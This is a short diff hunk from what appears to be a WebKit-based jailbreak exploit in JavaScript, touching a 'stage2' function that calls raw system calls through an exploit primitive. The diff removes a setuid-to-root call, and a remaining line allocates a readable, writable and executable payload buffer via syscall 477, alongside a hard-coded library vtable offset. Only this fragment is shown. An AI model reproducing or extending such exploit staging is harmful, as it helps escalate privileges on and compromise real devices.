@@ -59,7 +59,6 @@ var libwk_first_vt_entry_offset = 0x998E00;
 
 var nogc = [];
 var stage2_ = function () {
-	var t = p.syscall("sys_setuid", 0);
 	if (true) {
 		var payload_buffer = p.syscall(477, 0, 0x300000, 7, 0x41000, -1, 0);
 
